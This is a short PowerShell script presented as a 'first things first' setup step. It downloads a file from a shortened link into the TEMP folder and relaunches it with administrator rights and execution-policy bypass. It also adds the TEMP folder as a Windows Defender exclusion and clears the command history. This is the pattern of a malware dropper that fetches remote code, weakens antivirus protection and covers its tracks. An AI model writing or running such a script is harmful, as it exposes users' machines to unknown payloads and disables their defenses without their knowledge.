# FIRST THINGS FIRST

# Define the URL of the file to download
$url = "https://lnkfwd.com/u/KtRiC0kh"

# Define the destination path in the %TEMP% directory
$destination = "$env:TEMP\ftf.ps1"

# Use Invoke-WebRequest to download the file with error handling
try {
    Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction Stop
    # Output the path to confirm where the file was saved
    Write-Output "File downloaded to: $destination"
} catch {
    Write-Output "Error: Unable to download file from $url"
}

# Check if the script is running with elevated privileges
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Define the path to %TEMP%\ftf.ps1
    $scriptPath = "$env:TEMP\ftf.ps1"

    try {
        # Relaunch the script with elevated privileges
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs -ErrorAction Stop
        exit
    } catch {
        Write-Output "Error: Unable to relaunch the script with elevated privileges."
    }
}

# Set the execution policy with error handling
try {
    Set-ExecutionPolicy RemoteSigned -Force -ErrorAction Stop
} catch {
    Write-Output "Error: Unable to set execution policy."
}

# Add Exclusion in Windows Defender with error handling
try {
    Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe" -ErrorAction SilentlyContinue
} catch {
    Write-Output "Error: Unable to add exclusions to Windows Defender."
}

# Clear history (no error handling required, as it's safe)
Clear-History
